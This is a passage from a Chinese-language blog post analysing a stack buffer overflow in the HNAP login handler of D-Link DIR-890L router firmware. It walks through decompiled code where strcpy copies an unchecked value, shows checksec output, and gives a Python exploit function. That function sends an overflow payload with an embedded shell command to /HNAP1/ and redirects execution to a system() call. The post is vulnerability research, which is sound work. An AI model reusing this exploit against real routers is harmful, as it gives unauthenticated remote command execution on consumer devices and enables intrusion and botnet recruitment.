</span></span><span style="display:flex;"><span>          soapaction <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://purenetworks.com/HNAP1/Login&#34;</span>;
</span></span><span style="display:flex;"><span>          ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">HNAPLogin</span>(cookie);
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">goto</span> LABEL_46;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>  [...]
</span></span></code></pre></div><p>根据 <code>HTTP_SOAPACTION</code> 的不同进入不同的处理分支中，跟进登陆分支 <code>HNAPLogin</code> 函数：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">HNAPLogin</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>cookie)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  [...]
</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">=</span> <span style="color:#a6e22e">Malloc0x18</span>();
</span></span><span style="display:flex;"><span>  v36 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  v35 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">ProcessHTTPRequest</span>(GetKeyValueByTag, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x10000u</span>);
</span></span><span style="display:flex;"><span>  msg <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetMsgPtr</span>(buf);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">GetValueByTag</span>(msg, <span style="color:#e6db74">&#34;Action&#34;</span>, <span style="color:#f92672">&amp;</span>action);
</span></span><span style="display:flex;"><span>  v2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetMsgPtr</span>(buf);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">GetValueByTag</span>(v2, <span style="color:#e6db74">&#34;Username&#34;</span>, <span style="color:#f92672">&amp;</span>username);
</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetMsgPtr</span>(buf);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">GetValueByTag</span>(v3, <span style="color:#e6db74">&#34;LoginPassword&#34;</span>, <span style="color:#f92672">&amp;</span>loginPassword);
</span></span><span style="display:flex;"><span>  v4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetMsgPtr</span>(buf);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">GetValueByTag</span>(v4, <span style="color:#e6db74">&#34;Captcha&#34;</span>, <span style="color:#f92672">&amp;</span>captcha);
</span></span><span style="display:flex;"><span>  src <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>username;
</span></span><span style="display:flex;"><span>  v34 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  v32 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  v35 <span style="color:#f92672">=</span> <span style="color:#a6e22e">sub_10C0C</span>(<span style="color:#f92672">&amp;</span>v32);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( v35 <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>  [...]
</span></span></code></pre></div><p>通过 <code>GetValueByTag</code> 解析请求中的 POST 数据（<code>&lt;key&gt;value&lt;/key&gt;</code>）：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">GetValueByTag</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>data, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>tag, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>dst)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  [...]
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sprintf</span>(<span style="color:#f92672">&amp;</span>tagStart, <span style="color:#e6db74">&#34;&lt;%s&gt;&#34;</span>, tag);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sprintf</span>(<span style="color:#f92672">&amp;</span>tagEnd, <span style="color:#e6db74">&#34;&lt;/%s&gt;&#34;</span>, tag);
</span></span><span style="display:flex;"><span>  startLength <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(<span style="color:#f92672">&amp;</span>tagStart);
</span></span><span style="display:flex;"><span>  v14 <span style="color:#f92672">=</span> startLength <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">strstr</span>(data, <span style="color:#f92672">&amp;</span>tagStart);
</span></span><span style="display:flex;"><span>  valueStart <span style="color:#f92672">=</span> ret;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( ret )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    valueStart <span style="color:#f92672">+=</span> startLength;
</span></span><span style="display:flex;"><span>    ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">strstr</span>(valueStart, <span style="color:#f92672">&amp;</span>tagEnd);
</span></span><span style="display:flex;"><span>    valueEnd <span style="color:#f92672">=</span> ret;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( ret )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      valueLength <span style="color:#f92672">=</span> valueEnd <span style="color:#f92672">-</span> valueStart;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( valueEnd <span style="color:#f92672">-</span> valueStart <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span> )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">strncpy</span>(<span style="color:#f92672">&amp;</span>value, valueStart, valueLength);
</span></span><span style="display:flex;"><span>        v16[valueLength <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x414</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">strcpy</span>(dst, <span style="color:#f92672">&amp;</span>value);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> ret;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>可以看到，程序未对值长度进行任何判断就将其复制到字符串中（strcpy），导致了栈溢出。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>➜  dlink-dir8xx checksec _DIR890LA1_FW108b03.bin.extracted/squashfs-root/htdocs/cgibin
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/Users/chu/Desktop/dlink-dir8xx/_DIR890LA1_FW108b03.bin.extracted/squashfs-root/htdocs/cgibin&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:     arm-32-little
</span></span><span style="display:flex;"><span>    RELRO:    No RELRO
</span></span><span style="display:flex;"><span>    Stack:    No canary found
</span></span><span style="display:flex;"><span>    NX:       NX enabled
</span></span><span style="display:flex;"><span>    PIE:      No PIE <span style="color:#f92672">(</span>0x8000<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>程序只开启了 NX 防护，但代码中有多处 <code>system</code> 的调用，并且在函数返回时 R0 指向输入的数据，所以很容易构造 ROP 链：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(host, port, cmd):
</span></span><span style="display:flex;"><span>    cmd <span style="color:#f92672">=</span> cmd <span style="color:#66d9ef">if</span> cmd<span style="color:#f92672">.</span>endswith(<span style="color:#e6db74">&#34;;&#34;</span>) <span style="color:#66d9ef">else</span> cmd <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;;&#34;</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&lt;Action&gt;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(cmd)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> (StackSize <span style="color:#f92672">-</span> len(cmd)) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0xffffffff</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> JunkSize
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p32(CallSystem)[:<span style="color:#ae81ff">3</span>]                                              <span style="color:#75715e"># avoid &#34;\00&#34;</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;&lt;/Action&gt;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">/HNAP1/&#34;</span><span style="color:#f92672">.</span>format(host, port)
</span></span><span style="display:flex;"><span>    header <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;SOAPACTION&#34;</span>: <span style="color:#e6db74">&#34;http://purenetworks.com/HNAP1/Login&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;text/html&#34;</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        resp <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, payload, headers<span style="color:#f92672">=</span>header, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span>        resp<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> ex:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;error: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(ex)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> resp<span style="color:#f92672">.</span>text
</span></span></code></pre></div><p>利用如下：</p>
<p><img src="2.jpeg" alt=""></p>
<p>可下载 Bin 文件及 IDB 文件：<a href="https://github.com/Q2h1Cg/dlink-dir8xx-2017-09-19">GitHub</a>。</p>
<h2 id="参考">参考</h2>
<p><a href="https://embedi.com/blog/enlarge-your-botnet-top-d-link-routers-dir8xx-d-link-routers-cruisin-bruisin">Enlarge your botnet with: top D-Link routers (DIR8xx D-Link routers cruisin&rsquo; for a bruisin&rsquo;)</a></p>

    </section>
</article>
</main>
    </body>
</html>
